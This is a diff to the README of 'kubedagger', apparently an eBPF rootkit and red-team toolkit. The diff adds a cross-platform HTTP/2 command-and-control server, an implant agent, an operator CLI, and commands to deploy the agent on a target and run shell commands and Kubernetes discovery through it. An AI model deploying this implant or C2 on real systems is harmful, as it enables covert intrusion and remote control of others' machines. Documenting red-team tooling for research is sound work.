@@ -7,46 +7,110 @@
 [![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
 [![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
 
-An eBPF-based security research tool that demonstrates offensive techniques including network discovery, file system monitoring, process hiding, and container breakouts.
+An eBPF-based security research tool with a cross-platform HTTP/2 C2 framework. Demonstrates 57+ offensive techniques including network discovery, file system monitoring, process hiding, container breakouts, and cloud-native attacks. Supports Linux (eBPF kernel-level), Windows, and macOS (userspace agent).
 
 ## Disclaimer
 
 This project is provided for **educational purposes only**. Do not use these tools to violate the law. The author is not responsible for any illegal action. Misuse of the provided information can result in criminal charges.
 
+## Architecture
+
+```
+┌─────────────────────┐       HTTP/2 (mTLS)       ┌──────────────────────┐
+│   C2 Server         │◄─────────────────────────►│   Agent              │
+│ (kubedagger-server) │  cert-pinned, TLS 1.3     │ (kubedagger-agent)   │
+│                     │                            │                      │
+│ - Agent registry    │  POST /checkin (beacon)    │ - Shell executor     │
+│ - Task queue (FIFO) │  POST /task    (dispatch)  │ - Module system      │
+│ - Mgmt port (9443)  │  POST /result  (output)   │ - Cross-platform     │
+└─────────────────────┘                            └──────────────────────┘
+         ▲
+         │ ChaCha20-Poly1305 encrypted TCP
+         ▼
+┌─────────────────────┐
+│   Operator CLI       │
+│ (kubedagger-operator)│
+│                      │
+│ - agents / shell     │
+│ - module / tasks     │
+│ - status             │
+└──────────────────────┘
+```
+
+**Binaries:**
+
+| Binary | Description | Platform |
+|--------|-------------|----------|
+| `kubedagger` | eBPF rootkit daemon (loads kernel probes) | Linux only |
+| `kubedagger-client` | CLI for interacting with the eBPF daemon | Linux only |
+| `kubedagger-server` | HTTP/2 C2 server with mTLS + management port | Linux, macOS |
+| `kubedagger-agent` | Cross-platform implant (beacon + modules) | Linux, Windows, macOS |
+| `kubedagger-operator` | Operator CLI for managing agents/tasks | Linux, Windows, macOS |
+| `webapp` | Web-based control panel | Linux |
+
 ## Requirements
 
+**eBPF components (Linux only):**
 - Linux kernel 5.4+ with eBPF support (BTF-enabled for CO-RE portability)
-- Go 1.25+
-- Kernel headers installed in `lib/modules/$(uname -r)`
+- Kernel headers installed in `/lib/modules/$(uname -r)`
 - clang & llvm 11+
-- [Graphviz](https://graphviz.org/) (for network graph generation)
+- Root privileges
+
+**C2 components (cross-platform):**
+- Go 1.25+
+- No kernel dependencies
 
 ## Build
 
 ```shell
+# Build everything (eBPF + all binaries)
 make
-```
 
-To install the client to `/usr/bin/`:
+# Build only the C2 server
+make build-server
 
-```shell
+# Build cross-platform agents (linux/amd64, windows/amd64, darwin/arm64)
+make build-agent
+
+# Build operator CLI
+make build-operator
+
+# Install client to /usr/bin/
 make install_client
 ```
 
 ## Quick Start
 
+### eBPF Mode (Linux)
+
 ```shell
 # Check prerequisites
 ./scripts/check-prereqs.sh
 
-# Build
-make
-
-# Start the server (requires root)
+# Build and start the eBPF server (requires root)
+make rootkit
 sudo ./bin/kubedagger -i eth0 -e eth0
 
 # Use the client
 kubedagger-client -h
+```
+
+### C2 Mode (Cross-Platform)
+
+```shell
+# Generate encryption key for management port
+KEY=$(kubedagger-client c2 genkey)
+
+# Start the C2 server
+./bin/kubedagger-server -key $KEY -plaintext
+
+# Deploy agent on target (use --plaintext for dev, mTLS for production)
+./bin/kubedagger-agent-linux -server http://10.0.2.5:443 -plaintext
+
+# Interact via operator CLI
+./bin/kubedagger-operator -key $KEY agents
+./bin/kubedagger-operator -key $KEY shell <agent-id> whoami
+./bin/kubedagger-operator -key $KEY module <agent-id> k8s_discovery
 ```
 
 > **For full usage instructions, see [USAGE.md](USAGE.md)**
